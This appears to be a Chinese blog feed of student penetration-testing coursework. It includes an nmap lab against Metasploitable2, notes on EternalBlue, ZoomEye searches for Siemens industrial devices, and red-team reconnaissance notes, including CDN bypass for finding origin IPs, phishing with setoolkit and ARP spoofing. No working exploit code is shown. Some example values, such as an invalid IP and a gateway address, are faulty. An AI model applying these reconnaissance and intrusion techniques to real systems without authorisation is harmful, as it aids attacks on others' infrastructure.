<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195447579.png" alt="image-20231209195447579"></p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195450786.png" alt="image-20231209195450786"></p>
<p>该用户使用的apple品牌的的设备，访问的是广西桂林市教育网桂林电子科技大学网站。</p>
<h4 id="5-2访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"><a href="#5-2访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。" class="headerlink" title="5.2访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"></a>5.2访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</a></h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195521692.png" alt="image-20231209195521692"></p>
<p>可以发现两个值并不一样，cmd下查询的IP是局域网内的私有IP，网站查询的为为公网IP，是当前网络连接的出口IP。但此处公网IP为US归属，是因为接入了VPN使用。</p>
<p>这里涉及到的知识点是：可以通过NAT实现从私网IP到公网IP之间的联系。在报文离开私网进入Internet时，将源IP替换为公网地址，通常是出口设备的接口地址；一个对外的访问请求在到达目标以后，表现为由本组织出口设备发起，因此被请求的服务端可将响应由Internet发回出口网关；</p>
<p>出口网关再将目的地址替换为私网的源主机地址，发回内部。</p>
<h3 id="6-NMAP使用"><a href="#6-NMAP使用" class="headerlink" title="6.NMAP使用"></a>6.NMAP使用</h3><h4 id="6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"><a href="#6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。" class="headerlink" title="6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"></a>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195601791.png" alt="image-20231209195601791"></p>
<p>端口21的ftp（文件传输协议）服务，用于文件传输使用，是一种基于TCP的协议，采用客户&#x2F;服务器模式。通过FTP协议，用户可以在FTP服务器中进行文件的上传或下载等操作。（部分情况下可匿名登录</p>
<p>端口22的ssh服务：用于远程登录管理计算机或服务器等，专为远程登陆会话和其他网络服务提供的安全性协议。利用SSH协议可以有效的防止远程管理过程中的信息泄漏问题。</p>
<p>端口3306的mysql服务，mysql数据库用于管理网站等用户数据和信息。开放3306端口，可以远程登录并管理mysql服务。远程登录的话漏洞大多为弱口令，然后数据库写马。各个数据库端口开放不同。</p>
<p>端口80的http服务，这里的端口开放表示靶机有基于apache&#x2F;nhinx等的网站开放。</p>
<h4 id="6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"></a>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195637125.png" alt="image-20231209195637125"></p>
<p>OS类型为liunx系统，版本范围为；2.6.9-2.6.33</p>
<h4 id="6-3利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码。"><a href="#6-3利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码。" class="headerlink" title="6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。"></a>6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195657193.png" alt="image-20231209195657193"></p>
<h4 id="6-4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h4><p>WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。</p>
<p>这是msf中对于ms17_010_eternalblue.rb的简介：</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195717671.png" alt="image-20231209195717671"></p>
<p>永恒之蓝”利用了某些版本的微软服务器消息块（SMB）协议中的数个漏洞，而当中最严重的漏洞是允许远程电脑执行代码。大多利用复现多使用msfconsole进行。其利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过SMB漏洞上传WannaCry勒索病毒等恶意程序。</p>
<h3 id="7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195750810.png" alt="image-20231209195750810"></p>
<p>服务为CNIX HTTP Server 1.0版本过低，存在历史漏洞。</p>
<h3 id="8-Winhex简单数据恢复与取证"><a href="#8-Winhex简单数据恢复与取证" class="headerlink" title="8.Winhex简单数据恢复与取证"></a>8.Winhex简单数据恢复与取证</h3><h4 id="8-1elephant-jpg不能打开了，利用WinHex修复，说明修复过程。"><a href="#8-1elephant-jpg不能打开了，利用WinHex修复，说明修复过程。" class="headerlink" title="8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。"></a>8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</h4><p> 使用winHex打开后发现，文件格式头出现错误，修改一下即可。（将前四个数字改为FFD8）</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195846138.png" alt="image-20231209195846138"></p>
<h4 id="8-2笑脸背后的阴霾：图片smile有什么隐藏信息。"><a href="#8-2笑脸背后的阴霾：图片smile有什么隐藏信息。" class="headerlink" title="8.2笑脸背后的阴霾：图片smile有什么隐藏信息。"></a>8.2笑脸背后的阴霾：图片smile有什么隐藏信息。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195859266.png" alt="image-20231209195859266"></p>
<h4 id="8-3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"><a href="#8-3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。" class="headerlink" title="8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"></a>8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</h4><p> 因为U盘中存在之前删除的文件，所以直接用DiskGenius软件进行恢复：</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195919729.png" alt="image-20231209195919729"></p>
<h3 id="9-讨论学校热点GUET-WiFi的安全问题，以截图说明。"><a href="#9-讨论学校热点GUET-WiFi的安全问题，以截图说明。" class="headerlink" title="9.讨论学校热点GUET-WiFi的安全问题，以截图说明。"></a>9.讨论学校热点GUET-WiFi的安全问题，以截图说明。</h3><p>校园网存在端口隔离的安全保护。</p>
<p>同一校园网下，设备之间可以进行IP访问通讯，因此存在校内钓鱼网站的危险。例如使用setoolkit进行模拟<a href="http://www.baidu.com网站,获取查询信息./">www.baidu.com网站,获取查询信息。</a></p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209200045641.png" alt="image-20231209200045641"></p>
<p>2.可能存在Arp欺骗。可以使用arpspoof工具进行欺骗。</p>
<ul>
<li>详细见<a href="https://recyvan.github.io/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/">网络安全测试课程-作业-4</a></li>
</ul>
<p>3.校园网存在端口隔离的安全保护。</p>
<p>校园网下                                                    </p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210172047736.png" alt="image-20231210172047736"></p>
<p> 手机热点</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210172059959.png" alt="image-20231210172059959"></p>
<h4 id="扫描另一台物理主机，查看端口开放情况"><a href="#扫描另一台物理主机，查看端口开放情况" class="headerlink" title="扫描另一台物理主机，查看端口开放情况"></a>扫描另一台物理主机，查看端口开放情况</h4><p>扫描另一台物理主机，查看端口开放情况。</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210154508721.png" alt="image-20231210154508721"></p>
<p> 发现开放了80端口和135端口等多个端口，其中80端口为一道序列化题目，构造pop链后，可以通过include包含来获取权限。</p>
<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210154520869.png" alt="image-20231210154520869"></p>
<p>135端口：主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，RPC本身在处理通过TCP&#x2F;IP的消息交换部分有一个漏洞，该漏洞是由于错误地处理格式不正确的消息造成的。“冲击波”病毒，利用RPC漏洞可以攻击计算机。</p>
<h2 id="三-实验小结"><a href="#三-实验小结" class="headerlink" title="三 实验小结"></a>三 实验小结</h2><p>1.道德黑客的理解：</p>
<p>道德黑客，在我的认知中狭义地等同于白帽子。专门从事渗透测试及其他测试方法，确保信息系统安全。通过渗透测试来保证系统和设备安全。白帽黑客在网络用语中指站在黑客的立场攻击自己或被别人允许攻击的系统以进行安全漏洞排查的程序员。他们用的是黑客惯用的破坏攻击的方法，行的却是维护安全之事。</p>
<p>2.实验总结</p>
<ul>
<li><p>google hacker语法的简单实用</p>
</li>
<li><p>Kali exiftools工具使用</p>
</li>
<li><p>Kali msfconsole 简单使用</p>
</li>
<li><p>网络空间引擎的简单使用</p>
</li>
<li><p>公用IP和私有IP的区别</p>
</li>
</ul>
]]></content>
      <categories>
        <category>网络扫描与网络侦察</category>
      </categories>
      <tags>
        <tag>网络渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>红蓝对抗-信息搜集(1)</title>
    <url>/2023/11/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1/</url>
    <content><![CDATA[<h3 id="资产架构"><a href="#资产架构" class="headerlink" title="资产架构"></a>资产架构</h3><p>一个网站-&gt;存在多个程序&#x2F;端口应用，任何一个程序和应用出现漏洞，都可以进行安全测试</p>
<p>同一域名下含有多个网站-&gt; bbs.recyvan.com与edu.recyvan.com同在192.168.4.123下</p>
<blockquote>
<p>网站下多有各种插件(本身与接口)，api . web应用</p>
</blockquote>
<p>web单个源码指向安全</p>
<p>web多个目录源码安全-&gt;框架目录</p>
<p>we多个端口源码安全—&gt;ftp匿名登入</p>
<p>服务器架设多个站点安全</p>
<p>架设第三方插件接口安全</p>
<p>服务器架设多个应用安全</p>
<h3 id="番外安全"><a href="#番外安全" class="headerlink" title="番外安全"></a>番外安全</h3><p>基于域名解析安全</p>
<p>基于服务器本身的安全</p>
<p>基于服务商信息安全</p>
<p>基于管理个人的安全</p>
<h3 id="考虑阻碍"><a href="#考虑阻碍" class="headerlink" title="考虑阻碍"></a>考虑阻碍</h3><p>阻碍-站库分离</p>
<p>阻碍-CDN边加速服务</p>
<p>阻碍-负载均衡服务</p>
<p>阻碍-WAF应用防火墙</p>
<p>阻碍-主机防火墙</p>
<h3 id="打点知识点"><a href="#打点知识点" class="headerlink" title="打点知识点"></a>打点知识点</h3><p>fofa，钟馗之眼，撒旦，360quark，站长之家，lay子域名,云溪指纹(<a href="http://www.yunsee.cn)等指纹搜集/">www.yunsee.cn)等指纹搜集</a></p>
<p>F12下networks下查看相关php，js文件收集目录等信息-&gt;header-&gt;server,X-Powered-By</p>
<p>判断操作系统：在url上通过大小写判断，例如?id&#x3D;与?ID&#x3D;返回相同为win，不同异常为liunx（一般情况下）</p>
<p>​						TTL值判断操作系统，利用ping命令，根据TTL大小判断</p>
<p>源码框架已知-&gt;查找公开漏洞库</p>
<p>源码已知-&gt;白盒-&gt;代码审计</p>
<p>中间件安全-&gt;各种CVE</p>
<p>app抓包-&gt;模拟器-&gt;burp&#x2F;fidder&#x2F;charles-&gt;安装证书，设置代理-&gt;抓包</p>
<p>​		|__调用各种api 例如api.map.baidu<br>​        	   |__查看各种历史包-&gt;域名+文件名称(加载好session与cookie)-&gt;_返回各种信息<br>​			   |_在无工具下可通过开发者工具的network的response来搜集</p>
<p>子域名查看：例如<a href="http://www.recyvan.com/">www.recyvan.com</a> -&gt;查找recyvan.com和recyvan.cn</p>
<p>搜索备份文件(zip,bak,back)，git文件（泄露）-&gt;githack脚本攻击，composer.json泄露，web-inf泄露（RoarCTF-2019-Easyjava）SVN泄露-&gt;SVNhack脚本攻击，D_store泄露，CVS泄露</p>
<p>服务器网络架构：</p>
<blockquote>
<p>​	外网：171.40.778.855</p>
<p>​	内网：192.168.1.100-&gt;WEB</p>
<blockquote>
<p>外网出口（交换机）做一个映射（反向代理）</p>
<p>主动192.168.1.100-&gt;web流量给到171.40.78.83</p>
</blockquote>
</blockquote>
<p>waf识别软件：waf00f识别waf是否存在和类别</p>
<p>kali自带插件lbd +url识别负载均衡</p>
<h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p>CDN即<strong>內容分发网络</strong>（英语：Content Delivery Network或Content Distribution Network，缩写：CDN）是指一种透过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、影片、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。例如（阿里云的cDN架构，节选自《秒懂边缘云 | CDN基础入门：CDN原理及架构》）</p>
<p>当前阿里云 CDN 主要由调度系统、链路质量系统、缓存系统、支撑系统等子系统组成，这些子系统共同构成了 CDN 大脑神经网络来保证 CDN 的日常服务。</p>
<ul>
<li>调度系统：支持策略中心、DNS、HTTPDNS和302调度模式。当终端用户发起访问请求时，用户的访问请求会先进行域名DNS解析，调度系统将根据用户解析请求中携带的 IP 地址判断其区域、运营商，为用户选择并返回最佳接入节点 IP （DNS 未携带客户端 IP 时，调度根据DNS IP决策）。</li>
<li>链路质量系统：实时监测缓存系统中所有节点和链路的实时负载以及健康状况。调度系统在决策最优节点时，也会综合链路质量、实时负载等因素来为用户分配服务节点。</li>
<li>缓存系统：用户通过收到的最佳接入节点 IP 访问对应的缓存节点，如果节点已经缓存了用户请求的资源，会直接将资源返回给用户。</li>
<li>支撑系统：支撑服务系统包括天眼、数据智能和配置管理系统，分别具备了资源监测、数据分析和配置管理能力。</li>
</ul>
<p><img src="/2023/11/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1/typora/image/1650356594030-55b0ee85-bfc9-4aa8-aec9-b0d09c825de7.png" alt="image"></p>
<p>创建 CDN 加速域名后，CDN 将为您的加速域名分配 CNAME 记录值，您需要将域名解析至 CNAME 记录后才能接入CDN的智能调度系统。在正式接入 CDN 后，终端用户访问时经过的流程大致如下：</p>
<ol>
<li>本机 DNS 发起对访问域名的解析查询，加速域名权威DNS将响应您所配置的 CNAME 地址，DNS 继续对CNAME 记录发起查询后，解析结果将根据阿里云调度系统决策，从权威 DNS 中返回最优节点 IP 地址。</li>
<li>用户本地发起和节点 IP 的建联，建联后开始发送 HTTP 请求，此时访问节点为边缘节点（L1），如果 L1 节点已缓存了用户请求的文件，L1 将直接返回缓存内容给用户，此时请求结束。</li>
<li>如果边缘节点（L1）没有该文件的缓存，将回源至上层节点（L2）获取资源，如果 L2 节点已缓存用户请求的文件，将直接返回缓存内容给L1，L1响应给用户并将文件缓存到本地，此时请求结束。</li>
<li>如果 L2 节点也没有用户所请求的文件，L2 节点将根据您在CDN控制台上的配置，回源到您的业务源站拉取资源返回给 L1 ，并将文件缓存到 L2 本地，此时请求结束。</li>
</ol>
<hr>
<p>前置知识：</p>
<ul>
<li>传统访问：用户访问域名-&gt;解析服务器ip-&gt;访问目标主机</li>
<li>普通CDN：用户访问域名-&gt;CDN节点-&gt;真实服务器ip-&gt;访问目标主机</li>
<li>带WAF的CDN：用户访问域名-&gt;CDN节点（WAF）-&gt;真实服务器ip-&gt;访问目标主机</li>
</ul>
<p>CDN配置</p>
<ul>
<li>加速域名-需要启动加速的域名</li>
<li>加速区域-需要启动加速的地区</li>
<li>加速类型-需要启动加速的资源</li>
</ul>
<p>判断标准</p>
<ul>
<li>nslookup，各地（超级）ping-&gt;出现多个不同ip-&gt;CDN服务存在</li>
</ul>
<p>绕过方法</p>
<ul>
<li><p>查看子域名（有概率没有CDN加速）-&gt;google语法等</p>
</li>
<li><p>DNS历史解析记录-&gt;历史解析记录，可能会找到网站使用CDN前的解析记录，从而获取真实ip</p>
</li>
<li><blockquote>
<pre><code class="text">iphistory：https://viewdns.info/iphistory/
DNS查询：（https://dnsdb.io/zh-cn/）
DNS历史查询：（https://securitytrails.com/）
</code></pre>
</blockquote>
</li>
<li><p>head头部查看邮箱注册，邮箱找回密码等，大多为目标服务器发送</p>
</li>
<li><p>利用SSL证书寻找真实IP</p>
</li>
</ul>
<p>待更新。。。。勿急。。。。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>信息搜集，渗透测试，网络安全，红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全测试课程_作业_1</title>
    <url>/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/</url>
    <content><![CDATA[<h2 id="网络安全测试课程-作业一"><a href="#网络安全测试课程-作业一" class="headerlink" title="网络安全测试课程_作业一"></a>网络安全测试课程_作业一</h2><h3 id="VM下虚拟机网络配置信息"><a href="#VM下虚拟机网络配置信息" class="headerlink" title="VM下虚拟机网络配置信息"></a>VM下虚拟机网络配置信息</h3><p>VM下的虚拟机网络信息不同于PVE下的网络配置信息（PVE下多为vmbr0(0为编号)下的桥接模式）。</p>
<hr>
<p>在VM下以kali为例子,在网络适配器下，存在三种模式：桥接模式，NAT模式，仅主机模式。</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B7C973C18-9891-47e5-AD86-A57960A6A5E9%7D.png" alt="1"></p>
<p>存在两个网卡(在未安装docker，ks8等特殊情况下)VMnet0：用于桥接模式下的虚拟交换机，VMnet1：用于虚拟桥接网络下的虚拟交换机,VMnet8：用于虚拟 NAT 网络下的虚拟交换机。</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7BBFFE2E6D-4087-4366-AC6B-F67AD26957D5%7D.png" alt="2"></p>
<h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><p>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。</p>
<h4 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h4><p>NAT 模式，就是让虚拟系统借助 NAT（网络地址转换）功能，通过宿主机器所在的网络来访问公网。也就是说，使用 NAT 模式可以实现在虚拟系统里访问互联网，但前提是主机可以访问互联网。</p>
<p>NAT 模式下的虚拟系统的 TCP&#x2F;IP 配置信息是由 VMnet8（NAT）虚拟网络的 DHCP 服务器提供的，因此虚拟系统也就无法和本局域网中的其他真实主机进行通讯。</p>
<p>访问路径为虚拟机ip-&gt;主机-&gt;互联网</p>
<h4 id="仅主机模式"><a href="#仅主机模式" class="headerlink" title="仅主机模式"></a>仅主机模式</h4><p>仅主机模式的虚拟网络是一个封闭的网络环境，使得虚拟机成为一个独立的系统，所以多个虚拟机之间也可以互相访问，但一般情况下虚拟网络不能连接到 Internet。主机和虚拟机之间的通信是通过 VMnet1 虚拟网卡来实现的。此时如果想要虚拟机上外网则需要主机联网并且网络共享。</p>
<h3 id="相关配置命令"><a href="#相关配置命令" class="headerlink" title="相关配置命令"></a>相关配置命令</h3><p>win下可liunx下查看ip的一种方式：</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B1F97DB93-7F1E-4c6b-9E9F-FFFE21BAD996%7D.png" alt="3"></p>
<p>win下查看路由表</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7BA1ACE78D-927B-46a1-B2B6-7A11F3BC2A59%7D.png" alt="4"></p>
<p>加入想要通过vpn访问另一台主机上的虚拟机可以使用route add ip mask 255.255.255.0 metric 接口列表  ，来访问。</p>
<h4 id="kali下ip的配置文件为-etc-network-interfaces"><a href="#kali下ip的配置文件为-etc-network-interfaces" class="headerlink" title="kali下ip的配置文件为&#x2F;etc&#x2F;network&#x2F;interfaces"></a>kali下ip的配置文件为&#x2F;etc&#x2F;network&#x2F;interfaces</h4><p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B595364AB-7EBE-4afd-852A-7FE61C8118A2%7D.png" alt="5"></p>
<p>该文件文件不同于centos的conf配置信息</p>
<p>若为静态，应做如下设置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and how to activate them. For more information， see interfaces（5）。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The loopback network interface</span></span><br><span class="line">auto lo</span><br><span class="line"> </span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line"> </span><br><span class="line">iface eth0 inet static //配置eth0使用默认的静态地址</span><br><span class="line"> </span><br><span class="line">address 192.168.1.1 //设置eth0的IP地址</span><br><span class="line"> </span><br><span class="line">netmask 255.255.255.0 //配置eth0的子网掩码</span><br><span class="line"> </span><br><span class="line">gateway 192.168.1.0 //配置当前主机的默认网关```</span><br></pre></td></tr></table></figure>



<h3 id="实践作业"><a href="#实践作业" class="headerlink" title="实践作业"></a>实践作业</h3><h4 id="Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？"><a href="#Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？" class="headerlink" title="Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？"></a>Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？</h4><p>操作完成后。查看IP，发现，并不存在</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B9A0EE61E-CCC7-43a9-AF51-ADC5DB687072%7D.png" alt="6"></p>
<p>所以无法获得IP地址</p>
<ul>
<li><p>但在手机热点或其他wifi下，kali在桥接模式下时可以获得ip，并在物理机上可以访问到的，且局域网内其他主机也可访问到。</p>
<h4 id="Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？"><a href="#Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？" class="headerlink" title="Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？"></a>Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？</h4></li>
</ul>
<p>操作完成后。查看IP，发现可以获得</p>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B2632BCDC-B3E2-4d3e-A0A4-44851C24A492%7D.png" alt="7"></p>
<ul>
<li>注意事项，在win11 上连接热点时，最好将网络配置文件类型设置为”公用网络（推荐）“，同时重启网络。</li>
</ul>
<p><img src="/2023/11/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-1/%7B4FE79C7D-C6B9-47b0-9317-FBBB03F6BDD1%7D.png" alt="8"></p>
<h4 id="对于1、2的结果，进行总结分析。"><a href="#对于1、2的结果，进行总结分析。" class="headerlink" title="对于1、2的结果，进行总结分析。"></a>对于1、2的结果，进行总结分析。</h4><p>在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。</p>
<p>在校园网环境下，易出现不一致情况，当然也可能是校园网的网络设置就是这样。</p>
